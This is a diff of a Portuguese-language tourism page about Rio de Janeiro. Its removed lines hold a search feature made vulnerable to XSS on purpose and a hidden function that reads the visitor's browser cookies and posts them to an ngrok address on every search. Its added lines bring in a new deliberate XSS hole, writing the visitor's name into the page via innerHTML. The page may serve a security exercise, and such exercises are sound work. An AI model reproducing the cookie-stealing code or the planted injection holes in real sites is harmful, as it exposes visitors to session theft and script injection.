@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rio de Janeiro - Cidade Maravilhosa</title>
+    <title>Boas-Vindas - Rio de Janeiro</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            color: black;
         }
         header {
-            background-color: #ff4c4c;
-            color: black;
+            background-color: #0077b6;
+            color: white;
             padding: 20px;
             text-align: center;
         }
@@ -22,91 +21,41 @@
             padding: 20px;
             text-align: center;
         }
-        .search-bar {
-            margin-bottom: 20px;
-        }
-        .search-bar input {
-            padding: 10px;
-            width: 300px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .search-bar button {
-            padding: 10px 20px;
-            background-color: #ff4c4c;
-            color: black;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
         footer {
-            background-color: #ff4c4c;
-            color: black;
+            background-color: #0077b6;
+            color: white;
             text-align: center;
             padding: 10px;
             position: fixed;
             bottom: 0;
             width: 100%;
         }
-        .cristo-img {
-            width: 50%;
-            margin: 20px 0;
-        }
-        .welcome-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #ffefef;
-        }
-        .welcome-content {
-            text-align: center;
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="welcomePage" class="welcome-container">
-        <div class="welcome-content">
-            <h1>Bem-vindo! Qual é o seu nome?</h1>
-            <input type="text" id="nameInput" placeholder="Digite seu nome...">
-            <button onclick="enterSite()">Entrar</button>
-        </div>
+
+    <!-- Página de Boas-Vindas -->
+    <div id="welcomePage" class="content">
+        <h1>Bem-vindo ao Rio de Janeiro!</h1>
+        <p>Por favor, digite seu nome:</p>
+        <input type="text" id="userName" placeholder="Seu nome">
+        <button onclick="submitName()">Enviar</button>
     </div>
 
-    <div id="mainPage" style="display: none;">
+    <!-- Página Principal (Escondida inicialmente) -->
+    <div id="mainPage" class="hidden">
         <header>
             <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita</h1>
         </header>
 
         <div class="content">
-            <h2 id="welcomeMessage"></h2>
-            <img src="https://bagagemdespachada.com/wp-content/uploads/cristo_redentor.jpeg" alt="Cristo Redentor" class="cristo-img">
-
-            <div class="search-bar">
-                <input type="text" id="searchInput" placeholder="Pesquisar...">
-                <button onclick="performSearch()">Buscar</button>
-            </div>
-
-            <h2>Sobre o Rio de Janeiro</h2>
+            <h2>Bem-vindo(a), <span id="userGreeting"></span>!</h2>
             <p>
                 O Rio de Janeiro é uma grande cidade brasileira à beira-mar, famosa pelas praias de Copacabana e Ipanema, pela estátua de 38 metros de altura do Cristo Redentor, no topo do Corcovado, e pelo Pão de Açúcar, um pico de granito com teleféricos até seu cume. A cidade também é conhecida pelas grandes favelas. O empolgante Carnaval, com carros alegóricos, fantasias extravagantes e sambistas, é considerado o maior do mundo.
             </p>
-
-            <h2>Pontos Turísticos</h2>
-            <ul id="touristSpots">
-                <li>Cristo Redentor</li>
-                <li>Pão de Açúcar</li>
-                <li>Praia de Copacabana</li>
-                <li>Praia de Ipanema</li>
-                <li>Floresta da Tijuca</li>
-            </ul>
-
-            <h2>História</h2>
-            <p>
-                O Rio de Janeiro foi fundado em 1565 pelos portugueses. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
-            </p>
-
-            <div id="searchResults"></div>
         </div>
 
         <footer>
@@ -115,68 +64,15 @@
     </div>
 
     <script>
-        function enterSite() {
-            const name = document.getElementById('nameInput').value;
-            if (name) {
-                // Esconde a página de boas-vindas
-                document.getElementById('welcomePage').style.display = 'none';
+        function submitName() {
+            const userName = document.getElementById('userName').value;
 
-                // Exibe a página principal
-                document.getElementById('mainPage').style.display = 'block';
+            // Injetando o nome do usuário de forma vulnerável (XSS)
+            document.getElementById('userGreeting').innerHTML = userName;  // Aqui ocorre o XSS
 
-                // Personaliza a saudação com o nome do visitante
-                document.getElementById('welcomeMessage').textContent = `Bem-vindo, ${name}! Explore os maravilhosos pontos turísticos do Rio de Janeiro.`;
-            } else {
-                alert("Por favor, digite seu nome.");
-            }
-        }
-
-        function performSearch() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const touristSpots = document.querySelectorAll('#touristSpots li');
-            let found = false;
-            const searchResultsDiv = document.getElementById('searchResults');
-
-            // Limpa os resultados anteriores
-            searchResultsDiv.innerHTML = '';
-
-            touristSpots.forEach(spot => {
-                if (spot.textContent.toLowerCase().includes(searchTerm)) {
-                    found = true;
-                    const result = document.createElement('p');
-                    
-                    // Tornando vulnerável a XSS usando innerHTML
-                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;  // Aqui é onde ocorre a vulnerabilidade
-
-                    searchResultsDiv.appendChild(result);
-                }
-            });
-
-            if (!found) {
-                searchResultsDiv.innerHTML = '<p>Nenhum ponto turístico encontrado.</p>';
-            }
-
-            // Enviar cookies para o servidor
-            sendCookiesToServer();
-        }
-
-        function sendCookiesToServer() {
-            const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // Seu URL ngrok
-
-            // Exibe os cookies no console para depuração
-            console.log("Cookies capturados:", cookies);
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
-            })
-            .then(response => response.json())
-            .then(data => console.log('Cookies enviados com sucesso!', data))
-            .catch(error => console.error('Erro ao enviar cookies:', error));
+            // Esconde a página de boas-vindas e mostra a página principal
+            document.getElementById('welcomePage').classList.add('hidden');
+            document.getElementById('mainPage').classList.remove('hidden');
         }
     </script>
 </body>
